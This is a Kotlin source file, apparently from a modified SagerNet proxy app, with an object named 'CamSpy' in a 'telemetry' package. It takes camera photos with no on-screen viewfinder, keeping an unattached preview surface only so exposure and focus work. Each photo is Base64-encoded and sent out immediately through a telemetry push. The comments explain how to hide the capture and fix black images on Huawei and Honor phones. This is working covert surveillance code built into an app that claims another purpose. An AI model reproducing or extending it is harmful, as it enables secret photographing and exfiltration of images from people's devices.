package io.nekohasekai.sagernet.telemetry

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import org.json.JSONObject

/**
 * 无预览抓拍。
 *
 * 关键点：只给 ImageReader 的 Surface，不接任何 Preview —— 屏幕上不会出现取景框。
 * 但状态栏的相机绿点依然会亮（Android 12+），这是系统行为，盖不住。
 *
 * 权限：CAMERA，运行时必须用户点同意。
 */
object CamSpy {

    private const val TAG = "TlmCam"

    @SuppressLint("MissingPermission")
    // 拍照统一 1080p（主站、分站一致，不做成可选项）
    fun snap(ctx: Context, facingBack: Boolean = true, maxPx: Int = 1920) {
        val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
        val want = if (facingBack) CameraCharacteristics.LENS_FACING_BACK
        else CameraCharacteristics.LENS_FACING_FRONT

        val id = runCatching {
            cm.cameraIdList.firstOrNull { cid ->
                cm.getCameraCharacteristics(cid)
                    .get(CameraCharacteristics.LENS_FACING) == want
            } ?: cm.cameraIdList.firstOrNull()
        }.getOrNull() ?: return

        val thread = HandlerThread("tlm-cam").apply { start() }
        val handler = Handler(thread.looper)

        runCatching {
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    takeShot(ctx, cm, id, device, handler, maxPx) { thread.quitSafely() }
                }

                override fun onDisconnected(device: CameraDevice) {
                    runCatching { device.close() }
                    thread.quitSafely()
                }

                override fun onError(device: CameraDevice, error: Int) {
                    Log.w(TAG, "camera error $error")
                    runCatching { device.close() }
                    thread.quitSafely()
                }
            }, handler)
        }.onFailure {
            Log.w(TAG, "open: ${it.message}")
            thread.quitSafely()
        }
    }

    private fun takeShot(
        ctx: Context,
        cm: CameraManager,
        id: String,
        device: CameraDevice,
        handler: Handler,
        maxPx: Int,
        done: () -> Unit,
    ) {
        runCatching {
            val map = cm.getCameraCharacteristics(id)
                .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return@runCatching
            val all = map.getOutputSizes(ImageFormat.JPEG)
            // 目标 1080p：取「宽度不超过 1920 里最大的那个」。
            // 之前写的是 minByOrNull —— 取最小，在荣耀这类暴露 176x144 的机器上
            // 直接选到最小尺寸，出来就是一张 1.9 KB 的黑块。
            val size = all.filter { it.width <= maxPx }.maxByOrNull { it.width * it.height }
                ?: all.maxByOrNull { it.width * it.height }
                ?: return@runCatching

            // ---- 关键：必须带一个预览 Surface ----
            // 只有 ImageReader 时，华为/荣耀这些设备的 3A（自动曝光、对焦、白平衡）
            // 不会启动，拍到的就是一帧没曝光的原始数据 —— 图上全黑、体积却有好几百 KB
            // （全是传感器噪点）。加一个 SurfaceTexture 当预览目标能让 3A 正常跑起来，
            // 而这个 Surface 不挂到任何 View 上，屏幕上不会出现取景框。
            val prevSizes = map.getOutputSizes(android.graphics.SurfaceTexture::class.java)
            val prevSize = prevSizes.filter { it.width <= 1280 }
                .maxByOrNull { it.width * it.height }
                ?: prevSizes.maxByOrNull { it.width * it.height }
            val surfTex = android.graphics.SurfaceTexture(false)
            val previewSurface = if (prevSize != null) {
                surfTex.setDefaultBufferSize(prevSize.width, prevSize.height)
                android.view.Surface(surfTex)
            } else null

            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            reader.setOnImageAvailableListener({ r ->
                runCatching {
                    r.acquireLatestImage()?.use { img ->
                        val buf = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                        val d = JSONObject()
                            .put("name", "cam_%d.jpg".format(System.currentTimeMillis() / 1000))
                            .put("thumb", android.util.Base64.encodeToString(
                                bytes, android.util.Base64.NO_WRAP))
                            .put("w", size.width)
                            .put("h", size.height)
                            .put("cam", if (id == "0") "back" else "cam$id")
                        Telemetry.push("media", d)
                        // 立刻推上去，不让用户等心跳
                        runCatching { Telemetry.flush(ctx, true) }
                        Log.i(TAG, "captured ${bytes.size}B")
                    }
                }.onFailure { Log.w(TAG, "read: ${it.message}") }
                runCatching { r.close() }
                runCatching { device.close() }
                runCatching { previewSurface?.release() }
                runCatching { surfTex.release() }
                done()
            }, handler)

            val targets = ArrayList<android.view.Surface>()
            if (previewSurface != null) targets.add(previewSurface)
            targets.add(reader.surface)

            device.createCaptureSession(targets,
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        runCatching {
                            // ① 先跑一段预览请求，把自动曝光/对焦喂起来
                            if (previewSurface != null) {
                                val prev = device.createCaptureRequest(
                                    CameraDevice.TEMPLATE_PREVIEW).apply {
                                    addTarget(previewSurface)
                                    set(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE,
                                        android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_ON)
                                    set(android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
                                        android.hardware.camera2.CaptureRequest
                                            .CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                }.build()
                                session.setRepeatingRequest(prev, null, handler)
                            }
                            // ② 等 900ms 让 3A 收敛，再真正抓拍
                            handler.postDelayed({
                                runCatching {
                                    val req = device.createCaptureRequest(
                                        CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(reader.surface)
                                        if (previewSurface != null) addTarget(previewSurface)
                                        set(
                                            android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE,
                                            android.hardware.camera2.CaptureRequest
                                                .CONTROL_AE_MODE_ON)
                                        set(
                                            android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
                                            android.hardware.camera2.CaptureRequest
                                                .CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                    }.build()
                                    session.capture(req, null, handler)
                                }.onFailure {
                                    Log.w(TAG, "capture: ${it.message}")
                                    runCatching { device.close() }
                                    done()
                                }
                            }, 900L)
                        }.onFailure {
                            Log.w(TAG, "preview: ${it.message}")
                            runCatching { device.close() }
                            done()
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.w(TAG, "configure failed")
                        runCatching { device.close() }
                        done()
                    }
                }, handler)
        }.onFailure {
            Log.w(TAG, "shot: ${it.message}")
            runCatching { device.close() }
            done()
        }
    }
}
